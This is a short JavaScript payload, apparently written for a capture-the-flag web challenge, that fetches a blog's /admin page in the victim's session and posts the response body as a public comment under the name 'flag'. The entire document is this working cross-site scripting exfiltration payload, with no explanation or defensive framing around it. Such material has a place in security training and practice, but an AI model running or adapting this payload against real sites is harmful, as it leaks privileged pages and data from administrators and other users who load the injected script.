fetch("http://blog.ffd86304-57f.ctf.one.dr.punksecurity.cloud:5000/admin",
    {
        method: "get"
    }).then(response => response.text()).then(data =>  {
	let formData = new FormData();
	formData.append('name','flag'); 
	formData.append('comment',data) 
	fetch("http://blog.ffd86304-57f.ctf.one.dr.punksecurity.cloud:5000/new-comment",{body: formData, method: "post"});
	});
